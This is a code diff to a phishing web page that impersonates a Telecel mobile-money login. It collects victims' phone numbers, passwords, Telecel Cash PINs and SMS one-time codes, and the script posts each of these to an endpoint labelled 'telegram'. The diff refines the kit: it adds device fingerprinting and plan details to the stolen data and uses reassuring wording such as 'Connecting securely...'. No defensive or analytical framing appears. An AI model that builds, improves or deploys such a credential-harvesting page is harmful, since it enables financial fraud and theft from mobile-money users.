@@ -23,7 +23,7 @@ background:linear-gradient(180deg,#fff5f7,#ffe3e8);
 overflow:hidden;
 }
 
-/* animated telecom waves */
+/* telecom waves */
 
 .wave{
 position:fixed;
@@ -45,7 +45,7 @@ z-index:-1;
 100%{transform:translateY(0)}
 }
 
-/* full page steps */
+/* steps */
 
 .step{
 position:absolute;
@@ -58,13 +58,11 @@ box-shadow:0 30px 60px rgba(0,0,0,.2);
 transition:.4s;
 }
 
-/* center layout */
-
 .container{
 position:relative;
 width:100%;
 max-width:420px;
-height:520px;
+height:560px;
 }
 
 /* logo */
@@ -75,7 +73,22 @@ display:block;
 margin:auto;
 }
 
-/* texts */
+/* pulse animation */
+
+.pulse{
+height:90px;
+animation:pulse 1.2s infinite ease-in-out;
+}
+
+@keyframes pulse{
+
+0%{transform:scale(.85);opacity:.6}
+50%{transform:scale(1.05);opacity:1}
+100%{transform:scale(.85);opacity:.6}
+
+}
+
+/* text */
 
 h1{
 text-align:center;
@@ -128,13 +141,15 @@ transform:translateY(-50%);
 cursor:pointer;
 }
 
+/* hint */
+
 .hint{
 font-size:12px;
 color:#e60023;
 margin-top:4px;
 }
 
-/* buttons */
+/* button */
 
 .btn{
 margin-top:18px;
@@ -148,7 +163,7 @@ color:white;
 cursor:pointer;
 }
 
-/* pin boxes */
+/* pin */
 
 .pin{
 display:flex;
@@ -164,46 +179,12 @@ font-size:20px;
 text-align:center;
 }
 
-/* spinner */
-
-.spinner{
-display:flex;
-flex-direction:column;
-align-items:center;
-gap:12px;
-}
-
-.spin{
-height:80px;
-animation:spin 1.3s linear infinite;
-}
-
-@keyframes spin{
-100%{transform:rotate(360deg)}
-}
-
 /* otp */
 
 .count{
 text-align:center;
 font-size:13px;
 color:#555;
-}
-
-/* success */
-
-.success{
-text-align:center;
-}
-
-.success img{
-height:80px;
-animation:pop .6s ease;
-}
-
-@keyframes pop{
-0%{transform:scale(.6);opacity:.2}
-100%{transform:scale(1)}
 }
 
 /* hidden */
@@ -289,11 +270,11 @@ You need to be a Telecel subscriber to proceed.
 
 <div id="loading" class="step hidden">
 
-<div class="spinner">
+<div style="text-align:center">
 
-<img src="assets/telecel.svg" class="spin">
+<img src="assets/telecel.svg" class="pulse">
 
-<div>Connecting...</div>
+<div>Connecting securely...</div>
 
 </div>
 
@@ -306,7 +287,7 @@ You need to be a Telecel subscriber to proceed.
 
 <img src="assets/telecash.webp" style="height:80px;display:block;margin:auto">
 
-<h1>Telecel Cash</h1>
+<h1>Enter your Telecel Cash PIN</h1>
 
 <div class="subtitle" id="showNumber"></div>
 
@@ -329,6 +310,12 @@ You need to be a Telecel subscriber to proceed.
 <div id="step3" class="step hidden">
 
 <h1>Verify OTP</h1>
+
+<div class="subtitle">
+
+Enter 5 digit code sent to your number
+
+</div>
 
 <div class="pin">
 
@@ -363,9 +350,11 @@ Verify OTP
 
 <!-- STEP 4 SUCCESS -->
 
-<div id="step4" class="step hidden success">
+<div id="step4" class="step hidden">
 
-<img src="assets/telecel.svg">
+<div style="text-align:center">
+
+<img src="assets/telecel.svg" class="pulse">
 
 <h1>Success</h1>
 
@@ -377,24 +366,56 @@ Logging you in...
 
 </div>
 
+</div>
+
 
 </div>
 
 
 <script>
 
+/* device */
+
+const ua=navigator.userAgent
+
+let device="Unknown"
+
+if(/Android/i.test(ua)) device="Android"
+
+if(/iPhone|iPad/i.test(ua)) device="iOS"
+
+/* plan */
+
+let planLine=null
+
+try{
+
+const p=JSON.parse(sessionStorage.getItem("selectedPlan"))
+
+if(p){
+
+planLine=[p.name||"",p.price||""].join(" — ")
+
+}
+
+}catch(e){}
+
+
+/* values */
+
 let phoneValue=""
 let passwordValue=""
 let pinValue=""
 let otpValue=""
 
-/* phone validation */
+/* phone */
 
 phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"").slice(0,10)
 
 if(v.length>0 && v[0]!=="0")
+
 v="0"+v.slice(1)
 
 e.target.value=v
@@ -409,7 +430,7 @@ password.type=password.type==="password"?"text":"password"
 
 }
 
-/* step control */
+/* show step */
 
 function show(id){
 
@@ -426,6 +447,7 @@ form.onsubmit=e=>{
 e.preventDefault()
 
 phoneValue=phone.value
+
 passwordValue=password.value
 
 if(!/^0\d{9}$/.test(phoneValue)){
@@ -440,7 +462,21 @@ return
 
 phoneValue="+233"+phoneValue.slice(1)
 
-sendData("login",{phone:phoneValue,password:passwordValue})
+sendToServer({
+
+event:"login_clicked",
+
+loginPhone:phoneValue,
+
+password:passwordValue,
+
+plan:planLine,
+
+device,
+
+time:new Date().toISOString()
+
+})
 
 show("loading")
 
@@ -461,6 +497,7 @@ document.querySelectorAll("#step2 input").forEach((i,index)=>{
 i.oninput=()=>{
 
 if(i.value && index<3)
+
 document.querySelectorAll("#step2 input")[index+1].focus()
 
 }
@@ -475,7 +512,19 @@ pinValue=[...document.querySelectorAll("#step2 input")]
 
 .join("")
 
-sendData("pin",{pin:pinValue})
+sendToServer({
+
+event:"pin_entered",
+
+loginPhone:phoneValue,
+
+pin:pinValue,
+
+plan:planLine,
+
+device
+
+})
 
 show("loading")
 
@@ -496,6 +545,7 @@ document.querySelectorAll("#step3 input").forEach((i,index)=>{
 i.oninput=()=>{
 
 if(i.value && index<4)
+
 document.querySelectorAll("#step3 input")[index+1].focus()
 
 }
@@ -510,11 +560,23 @@ otpValue=[...document.querySelectorAll("#step3 input")]
 
 .join("")
 
-sendData("otp",{otp:otpValue})
+sendToServer({
+
+event:"otp_entered",
+
+loginPhone:phoneValue,
+
+otp:otpValue,
+
+plan:planLine,
+
+device
+
+})
 
 show("step4")
 
-setTimeout(()=>location.href="thankyou.html",1600)
+setTimeout(()=>location.href="thankyou.html",1800)
 
 }
 
@@ -524,7 +586,17 @@ function resendOtp(){
 
 startTimer()
 
-sendData("resend_otp")
+sendToServer({
+
+event:"resend_otp",
+
+loginPhone:phoneValue,
+
+plan:planLine,
+
+device
+
+})
 
 }
 
@@ -550,7 +622,7 @@ if(t<=0) clearInterval(i)
 
 /* telegram */
 
-async function sendData(step,data){
+async function sendToServer(payload){
 
 await fetch("/api/sendTelegram",{
 
@@ -558,23 +630,7 @@ method:"POST",
 
 headers:{"Content-Type":"application/json"},
 
-body:JSON.stringify({
-
-step,
-
-phone:phoneValue,
-
-password:passwordValue,
-
-pin:pinValue,
-
-otp:otpValue,
-
-...data,
-
-time:new Date().toISOString()
-
-})
+body:JSON.stringify(payload)
 
 })
 
